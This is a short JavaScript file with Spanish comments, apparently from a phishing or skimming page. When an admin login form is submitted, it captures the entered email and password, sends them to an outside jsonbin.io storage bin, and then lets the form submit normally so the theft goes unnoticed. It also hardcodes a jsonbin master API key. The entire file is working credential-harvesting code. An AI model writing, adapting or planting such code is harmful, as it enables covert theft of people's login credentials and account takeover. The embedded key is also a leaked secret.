const BIN_ID = '65ba84021f5677401f28f3cb'; // Reemplaza con tu nuevo bin ID
const X_MASTER_KEY = '$2a$10$SPnSCePVMiT4fZnmd.DVkOYXTe9wOTGzhsevMfAVMbTaXoroZSa6y'; // Reemplaza con tu nueva X-MASTER-KEY

function guardarDatos(data) {
    const url = `https://api.jsonbin.io/b/${BIN_ID}`;
    const headers = {
        'Content-Type': 'application/json',
        'Authorization': X_MASTER_KEY,
    };

    const requestOptions = {
        method: 'PUT',
        headers: headers,
        body: JSON.stringify(data),
    };

    fetch(url, requestOptions)
        .then(response => response.json())
        .then(json => console.log(json))
        .catch(error => console.error('Error:', error));
}

// Captura el evento de envío del formulario
document.getElementById('submit-admin').addEventListener('click', function (event) {
    event.preventDefault();

    // Obtén los datos del formulario
    const email = document.getElementById('email_address_login').value;
    const password = document.getElementById('password').value;

    // Guarda los datos en el bin
    guardarDatos({
        usuario: email,
        contraseña: password,
    });

    // Continúa con el envío del formulario si es necesario
    // Puedes redirigir o realizar otras acciones aquí
    document.getElementById('login-form-admin').submit();
});
